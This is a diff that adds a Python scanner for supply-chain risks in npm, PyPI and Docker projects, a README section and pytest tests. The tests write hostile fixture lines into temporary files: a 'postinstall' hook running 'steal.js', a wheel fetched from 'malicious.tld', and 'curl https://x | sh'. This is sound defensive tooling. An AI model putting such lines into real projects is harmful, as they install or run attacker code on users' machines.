++## Supply-chain compromise hardening
++
++Use `supply_chain_hardening.py` to detect high-impact compromise patterns across npm, PyPI, and Docker:
++
++```bash
++python3 supply_chain_hardening.py --root .
++python3 supply_chain_hardening.py --root . --apply-baseline
++```
++
++It flags risky install hooks, unpinned/remote dependencies, dependency confusion indicators, non-digest Docker bases, `curl|sh` execution, and root container defaults.
+diff --git a/supply_chain_hardening.py b/supply_chain_hardening.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..7a12150ac0efc107355be667f3ce3985fe8dcff8
+--- /dev/null
++++ b/supply_chain_hardening.py
+@@ -0,0 +1,297 @@
++#!/usr/bin/env python3
++"""Supply-chain hardening for npm, PyPI, and Docker projects.
++
++Focuses on high-impact compromise vectors:
++- npm lifecycle script abuse / unpinned & remote dependencies
++- PyPI dependency confusion / unpinned dependencies / direct URL installs
++- Docker base image drift / curl|sh patterns / root execution
++"""
++
++from __future__ import annotations
++
++import argparse
++import json
++import re
++from dataclasses import dataclass
++from pathlib import Path
++from typing import Iterable, List
++
++
++@dataclass
++class Finding:
++    ecosystem: str
++    file_path: Path
++    severity: str
++    title: str
++    detail: str
++    remediation: str
++
++
++class SupplyChainHardener:
++    LIFECYCLE_HOOKS = {
++        "preinstall",
++        "install",
++        "postinstall",
++        "prepublish",
++        "prepublishOnly",
++        "prepare",
++    }
++    BROAD_SPECS = ("*", "latest", "x", "^", "~", ">", "<")
++
++    def __init__(self, root: Path):
++        self.root = root
++
++    def scan(self) -> list[Finding]:
++        findings: list[Finding] = []
++        findings.extend(self._scan_npm())
++        findings.extend(self._scan_pypi())
++        findings.extend(self._scan_docker())
++        return findings
++
++    def _scan_npm(self) -> list[Finding]:
++        results: list[Finding] = []
++        for pkg in self.root.rglob("package.json"):
++            if "node_modules" in pkg.parts:
++                continue
++            try:
++                data = json.loads(pkg.read_text(encoding="utf-8"))
++            except (json.JSONDecodeError, OSError):
++                continue
++
++            scripts = data.get("scripts", {}) or {}
++            for hook in self.LIFECYCLE_HOOKS:
++                if hook in scripts:
++                    results.append(
++                        Finding(
++                            ecosystem="npm",
++                            file_path=pkg,
++                            severity="HIGH",
++                            title=f"Lifecycle hook `{hook}` can execute attacker code during install",
++                            detail=f"Script: {scripts[hook]}",
++                            remediation=(
++                                "Remove the lifecycle hook or gate it behind a signed, isolated CI task. "
++                                "Use `npm ci --ignore-scripts` by default."
++                            ),
++                        )
++                    )
++
++            for section in ("dependencies", "devDependencies", "optionalDependencies"):
++                deps = data.get(section, {}) or {}
++                for name, spec in deps.items():
++                    spec_text = str(spec).strip()
++                    if self._is_risky_npm_spec(spec_text):
++                        results.append(
++                            Finding(
++                                ecosystem="npm",
++                                file_path=pkg,
++                                severity="HIGH",
++                                title=f"Risky npm dependency spec for `{name}`",
++                                detail=f"{section}: {name} => {spec_text}",
++                                remediation=(
++                                    "Pin to an exact version and lock with package-lock.json. "
++                                    "Avoid git/http/file specs in production dependencies."
++                                ),
++                            )
++                        )
++        return results
++
++    def _scan_pypi(self) -> list[Finding]:
++        results: list[Finding] = []
++        req_files = list(self.root.rglob("requirements*.txt")) + list(self.root.rglob("constraints*.txt"))
++        for req in req_files:
++            if ".venv" in req.parts:
++                continue
++            try:
++                lines = req.read_text(encoding="utf-8").splitlines()
++            except OSError:
++                continue
++
++            for idx, raw in enumerate(lines, 1):
++                line = raw.strip()
++                if not line or line.startswith("#"):
++                    continue
++                if any(token in line for token in ("--extra-index-url", "--trusted-host", "--index-url")):
++                    results.append(
++                        Finding(
++                            ecosystem="pypi",
++                            file_path=req,
++                            severity="HIGH",
++                            title="Custom package index options can enable dependency confusion",
++                            detail=f"line {idx}: {line}",
++                            remediation=(
++                                "Prefer a single internal index mirror and enforce namespace allowlists. "
++                                "Do not mix public and private indexes without strict controls."
++                            ),
++                        )
++                    )
++                if ("@" in line and "http" in line) or line.startswith(("git+", "http://", "https://")):
++                    results.append(
++                        Finding(
++                            ecosystem="pypi",
++                            file_path=req,
++                            severity="HIGH",
++                            title="Direct URL dependency bypasses registry trust controls",
++                            detail=f"line {idx}: {line}",
++                            remediation="Replace direct URLs with pinned, hashed artifacts from your trusted mirror.",
++                        )
++                    )
++                if "==" not in line and not line.startswith(("-r", "--")):
++                    results.append(
++                        Finding(
++                            ecosystem="pypi",
++                            file_path=req,
++                            severity="HIGH",
++                            title="Unpinned Python dependency",
++                            detail=f"line {idx}: {line}",
++                            remediation="Pin exact versions and install with `pip install --require-hashes -r requirements.txt`.",
++                        )
++                    )
++        return results
++
++    def _scan_docker(self) -> list[Finding]:
++        results: list[Finding] = []
++        dockerfiles = [*self.root.rglob("Dockerfile"), *self.root.rglob("Dockerfile.*")]
++        for dockerfile in dockerfiles:
++            try:
++                lines = dockerfile.read_text(encoding="utf-8").splitlines()
++            except OSError:
++                continue
++            has_non_root_user = False
++            for idx, raw in enumerate(lines, 1):
++                line = raw.strip()
++                if not line or line.startswith("#"):
++                    continue
++                if line.upper().startswith("FROM ") and "@sha256:" not in line:
++                    results.append(
++                        Finding(
++                            ecosystem="docker",
++                            file_path=dockerfile,
++                            severity="HIGH",
++                            title="Base image is not pinned by digest",
++                            detail=f"line {idx}: {line}",
++                            remediation="Pin base image to immutable digest (e.g., `python:3.12-slim@sha256:<digest>`).",
++                        )
++                    )
++                lowered = line.lower()
++                if "curl" in lowered and "|" in lowered and ("sh" in lowered or "bash" in lowered):
++                    results.append(
++                        Finding(
++                            ecosystem="docker",
++                            file_path=dockerfile,
++                            severity="HIGH",
++                            title="`curl|sh` pattern detected",
++                            detail=f"line {idx}: {line}",
++                            remediation="Download with checksum/signature verification before execution.",
++                        )
++                    )
++                if line.upper().startswith("USER "):
++                    user_value = line.split(maxsplit=1)[1].strip()
++                    if user_value not in {"0", "root"}:
++                        has_non_root_user = True
++            if lines and not has_non_root_user:
++                results.append(
++                    Finding(
++                        ecosystem="docker",
++                        file_path=dockerfile,
++                        severity="HIGH",
++                        title="Container defaults to root user",
++                        detail="No non-root USER directive detected.",
++                        remediation="Add a dedicated unprivileged user and switch with `USER appuser`.",
++                    )
++                )
++        return results
++
++    @staticmethod
++    def _is_risky_npm_spec(spec: str) -> bool:
++        lower = spec.lower()
++        if lower.startswith(("git+", "http://", "https://", "file:", "link:")):
++            return True
++        if lower in {"*", "latest", "x"}:
++            return True
++        if lower.startswith(("^", "~", ">", "<")):
++            return True
++        return bool(re.search(r"\bgithub:\b", lower))
++
++
++class HardenWriter:
++    """Writes baseline policy files to prevent common compromise paths."""
++
++    def __init__(self, root: Path):
++        self.root = root
++
++    def apply(self) -> list[Path]:
++        touched: list[Path] = []
++        npmrc = self.root / ".npmrc"
++        npm_policy = "ignore-scripts=true\naudit=true\nfund=false\n"
++        if not npmrc.exists() or npmrc.read_text(encoding="utf-8") != npm_policy:
++            npmrc.write_text(npm_policy, encoding="utf-8")
++            touched.append(npmrc)
++
++        pip_dir = self.root / ".pip"
++        pip_dir.mkdir(exist_ok=True)
++        pip_conf = pip_dir / "pip.conf"
++        pip_policy = """[global]\nrequire-virtualenv = true\nno-cache-dir = false\ndisable-pip-version-check = true\n"""
++        if not pip_conf.exists() or pip_conf.read_text(encoding="utf-8") != pip_policy:
++            pip_conf.write_text(pip_policy, encoding="utf-8")
++            touched.append(pip_conf)
++
++        dockerignore = self.root / ".dockerignore"
++        existing = dockerignore.read_text(encoding="utf-8") if dockerignore.exists() else ""
++        required = [".git", ".env", "**/*.pem", "**/*id_rsa*", "node_modules", ".venv"]
++        merged = existing.splitlines()
++        updated = False
++        for item in required:
++            if item not in merged:
++                merged.append(item)
++                updated = True
++        if updated or not dockerignore.exists():
++            dockerignore.write_text("\n".join([x for x in merged if x]).strip() + "\n", encoding="utf-8")
++            touched.append(dockerignore)
++
++        return touched
++
++
++def print_findings(findings: Iterable[Finding]) -> int:
++    finding_list = list(findings)
++    if not finding_list:
++        print("No high-impact supply-chain findings detected.")
++        return 0
++    print(f"Detected {len(finding_list)} high-impact finding(s):")
++    for idx, finding in enumerate(finding_list, 1):
++        rel = finding.file_path
++        print(
++            f"[{idx}] [{finding.severity}] {finding.ecosystem} :: {finding.title}\n"
++            f"    file: {rel}\n"
++            f"    detail: {finding.detail}\n"
++            f"    remediation: {finding.remediation}\n"
++        )
++    return 2
++
++
++def parse_args() -> argparse.Namespace:
++    parser = argparse.ArgumentParser(description="Scan and harden npm/PyPI/Docker supply-chain risks.")
++    parser.add_argument("--root", default=".", help="Project root to scan")
++    parser.add_argument("--apply-baseline", action="store_true", help="Write baseline hardening policy files")
++    return parser.parse_args()
++
++
++def main() -> int:
++    args = parse_args()
++    root = Path(args.root).resolve()
++    hardener = SupplyChainHardener(root)
++    findings = hardener.scan()
++    code = print_findings(findings)
++
++    if args.apply_baseline:
++        touched = HardenWriter(root).apply()
++        if touched:
++            print("Applied baseline policies:")
++            for p in touched:
++                print(f" - {p.relative_to(root)}")
++        else:
++            print("Baseline policies already up to date.")
++    return code
++
++
++if __name__ == "__main__":
++    raise SystemExit(main())
+diff --git a/tests/test_supply_chain_hardening.py b/tests/test_supply_chain_hardening.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..ac90838fdbe4bb4cf470e71bdd59f97f8c33d1f5
+--- /dev/null
++++ b/tests/test_supply_chain_hardening.py
+@@ -0,0 +1,45 @@
++from pathlib import Path
++
++from supply_chain_hardening import HardenWriter, SupplyChainHardener
++
++
++def test_npm_lifecycle_and_risky_spec(tmp_path: Path):
++    pkg = tmp_path / "package.json"
++    pkg.write_text(
++        '{"scripts":{"postinstall":"node steal.js"},"dependencies":{"left-pad":"latest"}}',
++        encoding="utf-8",
++    )
++    findings = SupplyChainHardener(tmp_path).scan()
++    titles = [f.title for f in findings]
++    assert any("Lifecycle hook" in t for t in titles)
++    assert any("Risky npm dependency spec" in t for t in titles)
++
++
++def test_python_unpinned_and_direct_url(tmp_path: Path):
++    req = tmp_path / "requirements.txt"
++    req.write_text("requests\nprivatepkg @ https://malicious.tld/pkg.whl\n", encoding="utf-8")
++    findings = SupplyChainHardener(tmp_path).scan()
++    titles = [f.title for f in findings]
++    assert any("Unpinned Python dependency" in t for t in titles)
++    assert any("Direct URL dependency" in t for t in titles)
++
++
++def test_docker_findings(tmp_path: Path):
++    docker = tmp_path / "Dockerfile"
++    docker.write_text(
++        "FROM python:3.12-slim\nRUN curl https://x | sh\n",
++        encoding="utf-8",
++    )
++    findings = SupplyChainHardener(tmp_path).scan()
++    titles = [f.title for f in findings]
++    assert any("Base image is not pinned by digest" in t for t in titles)
++    assert any("curl|sh" in t for t in titles)
++    assert any("defaults to root" in t for t in titles)
++
++
++def test_baseline_writer(tmp_path: Path):
++    touched = HardenWriter(tmp_path).apply()
++    touched_names = sorted(p.name for p in touched)
++    assert ".npmrc" in touched_names
++    assert "pip.conf" in touched_names
++    assert ".dockerignore" in touched_names
